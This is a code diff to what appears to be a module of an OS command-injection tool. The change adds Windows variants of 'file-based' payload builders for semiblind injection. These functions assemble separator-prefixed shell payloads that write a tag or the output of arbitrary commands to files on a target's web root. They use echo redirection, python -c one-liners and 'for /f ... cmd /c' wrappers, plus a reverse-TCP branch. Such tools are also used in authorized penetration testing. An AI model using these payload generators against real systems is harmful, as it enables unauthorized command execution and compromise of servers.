@@ -15,7 +15,7 @@ For more see the file 'readme/COPYING' for copying permission.
 """
 
 """
-The "file-based" technique on Semiblind OS Command Injection.
+The "file-based" technique on semiblind OS command injection.
 The available "file-based" payloads.
 """
 
@@ -27,9 +27,14 @@ File-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, OUTPUT_TEXTFILE):
 
-  payload = (separator + " " +
+  if settings.TARGET_OS == "win":
+    payload = (separator + " " +
+              "echo " + TAG + " > " + OUTPUT_TEXTFILE 
+              ) 
+  else:
+    payload = (separator + " " +
             "$(echo " + TAG + "" + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + ")"
-            ) 
+              ) 
 
   return payload
 
@@ -38,15 +43,24 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
-  payload = (separator + " " + 
-            "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
-             ) 
+  if settings.TARGET_OS == "win":
+    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "', 'w').write('" + TAG + "')\""
+    payload = (separator + " " 
+              "for /f \"delims=\" %i in ('cmd /c " + 
+              python_payload +
+              "') do @set /p =%i <nul"
+              )
+  else:
+    payload = (separator + " " + 
+              "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")"
+               ) 
 
   if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
     payload = payload.replace("\n", separator)
   else:
     if not menu.options.base64:
-      payload = payload.replace("\n","%0d")
+      if settings.TARGET_OS != "win":
+        payload = payload.replace("\n","%0d")
 
   return payload
 
@@ -57,6 +71,11 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
   
   if settings.TFB_DECIMAL == True:
     payload = (separator + cmd)
+
+  elif settings.TARGET_OS == "win":
+    payload = (separator +
+              cmd + " > " + OUTPUT_TEXTFILE
+              ) 
   else:
     payload = (separator +
                "echo $(" + cmd + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + ")" 
@@ -68,17 +87,29 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
-  
-  payload = (separator + 
-            "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
-            )
+  if settings.TARGET_OS == "win":
+    if settings.REVERSE_TCP:
+      payload = (separator + " " + cmd + " "
+                )
+    else:
+      python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + ">" + OUTPUT_TEXTFILE + "')\""
+      payload = (separator + " " 
+                "for /f \"delims=\" %i in ('cmd /c " + 
+                python_payload +
+                "') do @set /p =%i <nul"
+                )
+  else:
+    payload = (separator + 
+              "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+              )
 
   # New line fixation
   if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
     payload = payload.replace("\n", separator)
   else:
     if not menu.options.base64:
-      payload = payload.replace("\n","%0d")
+      if settings.TARGET_OS != "win":
+        payload = payload.replace("\n","%0d")
 
   return payload
 
